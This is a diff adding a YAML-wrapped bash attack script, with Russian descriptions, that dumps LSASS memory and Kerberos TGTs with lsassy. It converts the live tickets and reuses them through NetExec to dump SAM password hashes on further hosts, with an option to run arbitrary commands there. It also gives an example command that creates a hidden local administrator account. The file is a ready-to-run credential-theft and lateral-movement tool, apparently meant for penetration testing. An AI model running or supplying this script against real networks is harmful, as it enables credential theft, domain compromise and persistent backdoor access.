@@ -1,0 +1,66 @@
+description: |- 
+  Дампит TGT с помощью lsassy и пытается с их помощью сдампить SAM на других хостах
+
+  Пример CMD на добавление локального админа:
+      net user mrtester supPass1234!ui /add && net localgroup Администраторы mrtester /add && net localgroup Administrators mrtester /add
+author: vinzekatze
+tags:
+  - lsassy
+  - sam
+  - tgt
+
+arguments:
+  lsassy-targets:
+    multiple: true
+    description: >-
+      цели, откуда будет дампиться LSASS: [[domain/]username[:password]@]<targetName or address> и/или файлы с такими строками
+  dump-hosts:
+    description: файл с целями для последующей атаки
+  cmd:
+    default:
+      -
+    description: исполнить команду на пробитом с помощью TGT хосте
+    metavar: COMMAND
+  o:
+    default: ./samdump-log.txt
+    metavar: FILE
+    description: выходной файл
+
+mode:
+  format:
+    lsassy-targets: '{!r}'
+    dump-hosts: '{!r}'
+    o: '{!r}'
+    cmd: '-x {!r}'
+
+shell: bash
+script: |-
+  for targ in $(cat #lsassy-targets# 2>/dev/null || echo #lsassy-targets#); do
+    echo -en "\e[1;91mTarget: \e[0m"; echo "${targ##*@} (${targ%%:*})";
+    echo -e "\e[1;92mStarting lsassy...\e[0m";
+    targip=${targ##*@}; targdomain=${targ%%/*}; targpreuser=${targ%%:*}; targuser=${targpreuser#*/}; targprepass=${targ%@*}; targpass=${targprepass#*:};
+    lsassy -nc -d "$targdomain" -u "$targuser" -p "$targpass" -K . -M ./masterkeys.txt "$targip"; echo;
+    count=0;
+    for tick in $(ls *.kirbi | grep -v '\$' | grep krbtgt); do 
+      ticktimeout=$(basename $(echo ${tick##*_}) .kirbi); 
+      timenow=$(date +%Y%m%d%H%M%S); 
+      actual=$(expr $ticktimeout - $timenow);
+      if [ $actual -gt 0 ]; then
+        count=1;
+        newtickname="$(basename $tick .kirbi).ccache";
+        ticketConverter.py $tick $newtickname;
+        ticketpath=$(realpath $newtickname);
+        test -f $ticketpath && { 
+          echo -e "\e[1;92mActual ticket:\e[0m";
+          echo $ticketpath; echo;
+          echo -e "\e[1;92mTry dumping...\e[0m";
+          export KRB5CCNAME=$ticketpath;
+          nxc smb #dump-hosts# --use-kcache --sam #cmd# --log #o#;
+          echo ; };
+      fi;
+    done;
+    [ $count = '0' ] && echo -e "\e[1;91mNo Actual Tickets \e[0m"; echo;
+    rm -f ./*.kirbi;
+  echo; done
+  
+  
